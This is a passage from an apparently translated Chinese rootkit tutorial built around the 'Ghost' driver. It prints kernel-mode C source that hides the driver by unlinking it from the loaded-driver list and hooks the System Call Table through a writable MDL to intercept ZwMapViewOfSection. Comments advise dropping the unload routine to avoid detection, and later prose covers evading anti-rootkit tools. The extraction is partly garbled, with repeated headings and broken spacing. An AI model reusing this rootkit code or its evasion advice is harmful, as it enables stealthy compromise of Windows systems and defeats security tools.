Ghost.c 文 件 中 还 需 要 增 加 的 是 调 用 Hook. Hook 在 hookManager.h 中 被 声 明 并 且 在
hookManager.c 中被执行。为了简单起见，更多复杂的头文件将在执行文件后列出。
执行文件如下:
// Ghost
// Copyright Ric Vieler, 2006
#include "ntddk.h"
#include "Ghost.h"
#include "fileManager.h"
#include "configManager.h"
#include "hookManager.h"
// Used to circumvent memory protected System Call Table
PVOID* NewSystemCallTable = NULL;
PMDL pMyMDL = NULL;
// Pointer(s) to original function(s)
ZWMAPVIEWOFSECTION OldZwMapViewOfSection;
// Global version data
ULONG majorVersion;
ULONG minorVersion;
// Comment out in free build to avoid detection
VOID OnUnload( IN PDRIVER_OBJECT pDriverObject )
{
DbgPrint("comint32: OnUnload called.");
// Unhook any hooked functions and return the Memory Descriptor List
if( NewSystemCallTable )
{
UNHOOK( ZwMapViewOfSection, OldZwMapViewOfSection );
MmUnmapLockedPages( NewSystemCallTable, pMyMDL );
IoFreeMdl( pMyMDL );
}
}
NTSTATUS DriverEntry( IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING
theRegistryPath )
{
DRIVER_DATA* driverData;
// Get the operating system version
PsGetVersion( &majorVersion, &minorVersion, NULL, NULL );
// Major = 4: Windows NT 4.0, Windows Me, Windows 98 or Windows 95
// Major = 5: Windows Server 2003, Windows XP or Windows 2000
// Minor = 0: Windows 2000, Windows NT 4.0 or Windows 95
// Minor = 1: Windows XP
// Minor = 2: Windows Server 2003
if ( majorVersion == 5 && minorVersion == 2 )
{
DbgPrint("comint32: Running on Windows 2003");
}
else if ( majorVersion == 5 && minorVersion == 1 )
{
DbgPrint("comint32: Running on Windows XP");
}
else if ( majorVersion == 5 && minorVersion == 0 )
{
DbgPrint("comint32: Running on Windows 2000");
}
else if ( majorVersion == 4 && minorVersion == 0 )
{
DbgPrint("comint32: Running on Windows NT 4.0");
}
else
{
DbgPrint("comint32: Running on unknown system");
}
// Hide this driver
driverData = *((DRIVER_DATA**)((DWORD)pDriverObject + 20));
if( driverData != NULL )
{
// unlink this driver entry from the driver list
*((PDWORD)driverData->listEntry.Blink) = (DWORD)driverData->listEntry.Flink;
driverData->listEntry.Flink->Blink = driverData->listEntry.Blink;
}
// Comment out in free build to avoid detection
theDriverObject->DriverUnload = OnUnload;
// Configure the controller connection
if( !NT_SUCCESS( Configure() ) )
{
DbgPrint("comint32: Could not configure remote connection.\n");
return STATUS_UNSUCCESSFUL;
}
// Hook the System Call Table
if( !NT_SUCCESS( Hook() ) )
{
DbgPrint("comint32: Could not hook the System Call Table.\n");
return STATUS_UNSUCCESSFUL;
}
return STATUS_SUCCESS;
}
HookManager.c
HookManager.c
HookManager.c
HookManager.c
hookManager.c 文件中只有两个函数：NewZwMapViewOfSection 和 Hook。在显示一个
快 速 的 debug 调 试 语 句 后 NewZwMapViewOfSection 简 单 的 调 用 原 始 的
ZwMapViewOfSection。Hook 是这章的关键。挂钩是本章的关键。这里创建了系统调用表的
一个可写 MDL，并内核调用重定向到我们的函数：
// hookManager
// Copyright Ric Vieler, 2006
// Hook the System Call Table
#include "ntddk.h"
#include "hookManager.h"
#include "Ghost.h"
NTSTATUS NewZwMapViewOfSection(
IN HANDLE SectionHandle,
IN HANDLE ProcessHandle,
IN OUT PVOID *BaseAddress,
IN ULONG ZeroBits,
IN ULONG CommitSize,
IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
IN OUT PSIZE_T ViewSize,
IN SECTION_INHERIT InheritDisposition,
IN ULONG AllocationType,
IN ULONG Protect )
{
NTSTATUS status;
DbgPrint("comint32: NewZwMapViewOfSection called.");
// we can do whatever we want with the input here
// and return or continue to the original function
status = OldZwMapViewOfSection(
SectionHandle,
ProcessHandle,
BaseAddress,
ZeroBits,
CommitSize,
SectionOffset OPTIONAL,
ViewSize,
InheritDisposition,
AllocationType,
Protect );
// we can do whatever we want with the output here
// and return any value including the actual one
return status;
}
NTSTATUS Hook( )
{
// Needed for HOOK_INDEX
RtlInitUnicodeString(&dllName, L"\\SystemRoot\\system32\\ntdll.dll");
pMyMDL = MmCreateMdl(NULL,
KeServiceDescriptorTable.ServiceTableBase,
KeServiceDescriptorTable.NumberOfServices * 4 );
if( !pMyMDL )
return( STATUS_UNSUCCESSFUL );
MmBuildMdlForNonPagedPool( pMyMDL );
pMyMDL->MdlFlags = pMyMDL->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
NewSystemCallTable = MmMapLockedPages( pMyMDL, KernelMode );
if( !NewSystemCallTable )
return( STATUS_UNSUCCESSFUL );
// Add hooks here (remember to unhook if using DriverUnload)
HOOK( ZwMapViewOfSection, NewZwMapViewOfSection, OldZwMapViewOfSection );
return( STATUS_SUCCESS );
}
HookManager.h
HookManager.h
HookManager.h
HookManager.h
hookManager.h
文 件 首 先 定 义 了
ServiceDescriptorEntry
结 构 。 这 是
KeServiceDescriptorTable 所必须的输入结构。这个结构被打包成与内存中相匹配的实际结
构 。在 in Ghost.c 中 全局变量定义了三个外部函数 NewSystemCallTable, pMyMDL,和
OldZwMapViewOfSection。为了使挂钩安全、简单，还定义了三个宏指令 HOOK_INDEX,
HOOK,和 UNHOOK。最后，在 hookManager.c 中实现了 NewZwMapViewOfSection 和 Hook
函数的声明：
// Copyright Ric Vieler, 2006
// Support header for hookManager.c
#ifndef _HOOK_MANAGER_H_
#define _HOOK_MANAGER_H_
// The kernel's Service Descriptor Table
#pragma pack(1)
typedef struct ServiceDescriptorEntry
{
unsigned int *ServiceTableBase;
unsigned int *ServiceCounterTableBase;
unsigned int NumberOfServices;
unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()
__declspec(dllimport) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
// Our System Call Table
extern PVOID* NewSystemCallTable;
// Our Memory Descriptor List
extern PMDL pMyMDL;
#define HOOK_INDEX(function2hook) *(PULONG)((PUCHAR)function2hook+1)
#define HOOK(functionName, newPointer2Function, oldPointer2Function )
\
oldPointer2Function = (PVOID) InterlockedExchange( (PLONG)
&NewSystemCallTable[HOOK_INDEX(functionName)], (LONG) newPointer2Function)
#define UNHOOK(functionName, oldPointer2Function)
\
InterlockedExchange(
(PLONG)
&NewSystemCallTable[HOOK_INDEX(functionName)],
(LONG)
oldPointer2Function)
typedef NTSTATUS (*ZWMAPVIEWOFSECTION)(
IN HANDLE SectionHandle,
IN HANDLE ProcessHandle,
IN OUT PVOID *BaseAddress,
IN ULONG ZeroBits,
IN ULONG CommitSize,
IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
IN OUT PSIZE_T ViewSize,
IN SECTION_INHERIT InheritDisposition,
IN ULONG AllocationType,
IN ULONG Protect );
extern ZWMAPVIEWOFSECTION OldZwMapViewOfSection;
NTSTATUS NewZwMapViewOfSection(
IN HANDLE SectionHandle,
IN HANDLE ProcessHandle,
IN OUT PVOID *BaseAddress,
IN ULONG ZeroBits,
IN ULONG CommitSize,
IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
IN OUT PSIZE_T ViewSize,
IN SECTION_INHERIT InheritDisposition,
IN ULONG AllocationType,
IN ULONG Protect );
NTSTATUS Hook();
#endif
如果你已经使用了 Checked DDK 和 SCMLoader.exe 来编译和加载完成，那么你可以使
用命令“net start MyDeviceDriver”来开始运行服务并可以看到 debug 调试语句“comint32:
NewZwMapViewOfSection”，说明一个新的应用程序被加载。
挂钩什么函数
现在你已经知道怎样挂钩系统调用表中的函数了，你应该想了解这些函数都是什么？他
们是怎样工作的呢？。ntdll.dll 中有几百个输出函数，因此列出这些函数并描述他们的用途
是本书的内容。幸运的是，详细描述可以通过函数集合来描述。
查 看 ntdll.dll 中 的 每 个 输 出 函 数 ， 你 可 以 很 简 单 的 将 ntdll.dll ( 通 常 在
c:\windows\system32 目录)拖放到 IDA 中。IDA 加载了这个文件以后，你可以选择菜单选项
Navigate->Jump To->Function,可以看到一个包括所有输出函数的列表。此外，如果你有时间，
可以通过这些函数将你引入逆向工程的世界。
这不是一本内核模式编程的入门书；因此不会进行详细描述。对于刚刚起步的初学者，
这里的描述已经够用了，但是使用这些函数将需要内核模式编程的专业知识。
ntdll.dll 的输出函数可以简单的通过前缀来分组表示。下面一节来描述这些函数组。
Csr
Csr
Csr
Csr ---- 客户（服务器）运行时间
这里只有几个 Csr 例程(在 Windows 2003 Server 系统中有 15 个)。这个组包括如下内容：
CsrClientCallServer
CsrCaptureMessageBuffer
CsrConnectClientToServer
CrsNewThread
如果你需要挂钩客户/服务器操作，你需要更深入的了解 Csr 函数组。
Dbg
Dbg
Dbg
Dbg ---- Debug
Debug
Debug
Debug 调试管理器
这里只有几个 Dbg 例程(在 Windows 2003 Server 系统中有 18 个)。这个组包括如下内容：
DbgBreakPoint
DbgUserBreakPoint
DbgPrint
DbgUiConnectToDbg
如果你需要挂钩 debug 操作，你需要更深入的了解 Dbg 函数组。
Etw
Etw
Etw
Etw ---- Windows
Windows
Windows
Windows 事件跟踪
这里只有几个 Etw 例程(在 Windows 2003 Server 系统中有 33 个)。这个组包括如下内容：
EtwTraceEvent
EtwEnableTrace
EtwGetTraceEnableLevel
EtwGetTraceEnableFlags
如果你需要挂钩事件跟踪操作，你需要更深入的了解 Etw 函数组。
Ki
Ki
Ki
Ki ---- 内核函数((((必须来自内核调用))))
只有很少的几个 Ki 例程(Windows 2003 Server 系统中有 4 个)。这些子程序必须在内核中调
用，因此很少有机会需要挂钩它们。这个组包括如下内容：
KiUserCallbackDispatcher
KiRaiseUserExceptionDispatcher
KiUserApcDispatcher
KiUserExceptionDispatcher
Ldr
Ldr
Ldr
Ldr ---- 加载程序管理器
这里只有几个 Ldr 例程(在 Windows 2003 Server 系统中有 36 个)。这个组包括如下内容：
LdrInitializeThunk
LdrLockLoaderLock
LdrUnlockLoaderLock
LdrGetDllHandle
LdrGetProcedureAddress
如果你需要挂钩加载器操作，你需要更深入的了解 Ldr 函数组。
Pfx
Pfx
Pfx
Pfx ---- ANSI
ANSI
ANSI
ANSI 前缀管理器
这里只有几个 Pfx 例程(在 Windows 2003 Server 系统中有 4 个)。这个组包括如下内容：
PfxInitialize
PfxRemovePrefix
PfxInsertPrefix
PfxFindPrefix
如果你需要挂钩 ASNI 字符串表操作，你需要了解这些子程序。
Rtl
Rtl
Rtl
Rtl ---- 运行时间库
这里是关于一些操作的 Rtl 子程序：
初始化和使用字符串
初始化和使用线程
初始化和使用资源
初始化和使用关键段
初始化和使用安全目标
操作内存
操作数据类型
异常处理
访问处理
计时器操作
堆操作
压缩和解压操作
IPv4 和 IPv6 操作
Zw
Zw
Zw
Zw ---- 文件和注册表
关于下列操作的 Zw 子程序如下：
文件操作
注册表操作
访问处理
计时器操作
事件操作
令牌操作
进程操作
端口操作
除此之外还有更多。
挂钩存在的问题
有一些 anti-rootkit 应用程序可以重建系统调用表。可以通过从原始文件 ntoskrnl.exe 重
新初始化内核内存的方法来实现。如果系统调用表在我们的 rootkit 安装后被重建，那么所
有的钩子将会失效。为了防止这种可能性发生，新的 rootkit 跟着表入口来到实际函数并修
复函数自身使他们跳转到各自的 rootkit 子程序。这个技术被叫做 “trampolining（蹦床）”，
并被用作进程注入，第四章将详细介绍。
当然，新的 anti-rootkit 程序也可以跟随表入口来到真实函数并恢复被更改的函数，因此
你的 rootkit 需要一个方法来欺骗系统调用表的检查，或者欺骗 ntoskrnl.exe 的加载。因为在
真实内核函数中增加跳转会使 anti-rootkit 软件更难清除你的挂钩，增加更多的挂钩来阻止